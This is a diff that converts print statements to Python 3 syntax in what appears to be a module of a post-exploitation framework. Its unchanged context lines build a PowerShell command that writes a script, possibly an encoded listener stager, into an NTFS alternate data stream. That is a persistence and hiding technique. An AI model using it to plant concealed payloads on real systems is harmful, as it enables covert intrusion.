@@ -1,3 +1,4 @@
+from __future__ import print_function
 import os
 from lib.common import helpers
 
@@ -127,7 +128,7 @@ class Module:
             if adsPath != '':
                 # remove the ADS storage location
                 if ".txt" not in adsPath:
-                    print helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt")
+                    print(helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt"))
                     return ""
 
                 script = "Invoke-Command -ScriptBlock {cmd /C \"echo x > "+adsPath+"\"};"
@@ -159,14 +160,14 @@ class Module:
                 statusMsg += "using external file " + extFile
 
             else:
-                print helpers.color("[!] File does not exist: " + extFile)
+                print(helpers.color("[!] File does not exist: " + extFile))
                 return ""
 
         else:
             # if an external file isn't specified, use a listener
             if not self.mainMenu.listeners.is_listener_valid(listenerName):
                 # not a valid listener, return nothing for the script
-                print helpers.color("[!] Invalid listener: " + listenerName)
+                print(helpers.color("[!] Invalid listener: " + listenerName))
                 return ""
 
             else:
@@ -179,7 +180,7 @@ class Module:
             # store the script in the specified alternate data stream location
         if adsPath != '':
                 if ".txt" not in adsPath:
-                    print helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt")
+                    print(helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt"))
                     return ""
             
             	script = "Invoke-Command -ScriptBlock {cmd /C \"echo "+encScript+" > "+adsPath+"\"};"
